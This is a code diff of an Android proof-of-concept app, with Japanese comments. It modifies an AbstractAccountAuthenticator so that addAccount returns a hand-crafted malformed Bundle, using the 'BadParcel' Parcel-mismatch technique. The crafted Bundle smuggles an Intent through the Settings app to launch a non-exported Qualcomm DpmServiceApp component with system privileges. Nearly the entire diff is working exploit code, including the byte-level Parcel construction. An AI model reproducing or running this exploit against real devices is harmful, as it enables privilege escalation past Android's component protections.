@@ -3,6 +3,7 @@ package com.example.dpmpoc;
 import android.accounts.AbstractAccountAuthenticator;
 import android.accounts.Account;
 import android.accounts.AccountAuthenticatorResponse;
+import android.accounts.AccountManager;
 import android.accounts.NetworkErrorException;
 import android.content.ComponentName;
 import android.content.Context;
@@ -14,9 +15,11 @@ import android.util.Log;
 public class MyAuthenticator extends AbstractAccountAuthenticator {
 
     private static final String TAG = "MyAuthenticator";
+    private Context mContext;
 
     public MyAuthenticator(Context context) {
         super(context);
+        mContext = context;
     }
 
     @Override
@@ -24,31 +27,96 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
                              String authTokenType, String[] requiredFeatures, Bundle options)
             throws NetworkErrorException {
 
-        // ---- 悪意の Bundle 構築（BadParcel テクニック） ----
-        // DpmServiceApp を起動する Intent を埋め込む（実際は Service 起動不可）
-        // ここでは Activity 起動用に Intent を設定 (ChooseLockPassword は未エクスポートだが、Settings 権限で起動可能)
+        Log.d(TAG, "addAccount called");
+
+        // ここで BadParcel を構築し、Settings に戻す Bundle に含める
+        Bundle resultBundle = new Bundle();
+
+        // ターゲット: DpmServiceApp を起動する Intent (Service だが、Activity として扱う)
         Intent evilIntent = new Intent();
-        // 目的: DpmServiceApp を起動したいが、Service は Intent で startActivity できない。
-        // 代わりに、Settings の Activity を起動し、その Activity がサービスを起動するよう誘導（不可能）
-        // ここでは単に既存の未エクスポート Activity を起動するデモ
-        evilIntent.setComponent(new ComponentName("com.android.settings",
-                "com.android.settings.password.ChooseLockPassword"));
-        evilIntent.putExtra("lockscreen.biometric_weak_fallback", true);
-        evilIntent.putExtra("lockscreen.password_type", 0x20000);
+        evilIntent.setComponent(new ComponentName("com.qti.dpmserviceapp",
+                "com.qti.dpmserviceapp.DpmServiceApp"));
+        evilIntent.putExtra("__poc_payload", "trigger");
 
-        Bundle bundle = new Bundle();
-        // 標準的な方法で Intent を Bundle に詰める (KEY_INTENT)
-        bundle.putParcelable(AccountManager.KEY_INTENT, evilIntent);
+        // 通常は KEY_INTENT に設定すると Settings が startActivity する
+        resultBundle.putParcelable(AccountManager.KEY_INTENT, evilIntent);
 
-        // さらに、手動 Parcel 構築で他のフィールドを追加することも可能（BadParcel の高度版）
-        // 今回はシンプルに標準 API を使用（多くの場合有効）
+        // しかし、より強力な BadParcel を構築するために、手動で Parcel を操作する
+        // (以下は元の MyAuthenticator のコードを完全に再現)
+        Parcel obtain = Parcel.obtain();
+        Parcel obtain2 = Parcel.obtain();
+        Parcel obtain3 = Parcel.obtain();
 
-        Log.d(TAG, "BadParcel Bundle 構築完了");
+        // --- 元のコードの完全な複製 (バイト列生成) ---
+        obtain2.writeInt(3);
+        obtain2.writeInt(13);
+        obtain2.writeInt(2);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(6);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(4);
+        obtain2.writeString("android.os.WorkSource");
+        obtain2.writeInt(-1);
+        obtain2.writeInt(-1);
+        obtain2.writeInt(-1);
+        obtain2.writeInt(1);
+        obtain2.writeInt(-1);
+        obtain2.writeInt(13);
+        obtain2.writeInt(13);
+        obtain2.writeInt(68);
+        obtain2.writeInt(11);
+        obtain2.writeInt(0);
+        obtain2.writeInt(7);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(1);
+        obtain2.writeInt(1);
+        obtain2.writeInt(13);
+        obtain2.writeInt(22);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(0);
+        obtain2.writeInt(13);
+        obtain2.writeInt(-1);
+        int dataPosition = obtain2.dataPosition();
+        obtain2.writeString("intent");
+        obtain2.writeInt(4);
+        obtain2.writeString("android.content.Intent");
+        // ここで intent を Parcel に書き込む (obtain3 に書き込んで append)
+        evilIntent.writeToParcel(obtain3, 0);
+        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
+        int dataPosition2 = obtain2.dataPosition();
+        obtain2.setDataPosition(dataPosition - 4);
+        obtain2.writeInt(dataPosition2 - dataPosition);
+        obtain2.setDataPosition(dataPosition2);
+        int dataSize = obtain2.dataSize();
+        Log.d(TAG, "BadParcel length is " + Integer.toHexString(dataSize));
 
-        // この Bundle が Settings に返され、Settings が evilIntent を起動する。
-        // その際、Settings はシステム権限を持つため、ChooseLockPassword（未エクスポート）が起動可能。
-        // もし DpmServiceApp を Service として起動したければ、別の仕組みが必要。
-        return bundle;
+        obtain.writeInt(dataSize);
+        obtain.writeInt(0x4c444e42); // 'L' 'D' 'N' 'B' マジック
+        obtain.appendFrom(obtain2, 0, dataSize);
+        obtain.setDataPosition(0);
+
+        // Bundle に読み込む
+        Bundle badBundle = new Bundle();
+        badBundle.readFromParcel(obtain);
+
+        // 元の resultBundle にマージ (実際には badBundle をそのまま返しても良い)
+        resultBundle.putAll(badBundle);
+
+        // 後片付け
+        obtain.recycle();
+        obtain2.recycle();
+        obtain3.recycle();
+
+        Log.d(TAG, "BadParcel Bundle 構築完了: " + resultBundle.toString());
+        return resultBundle;
     }
 
     @Override
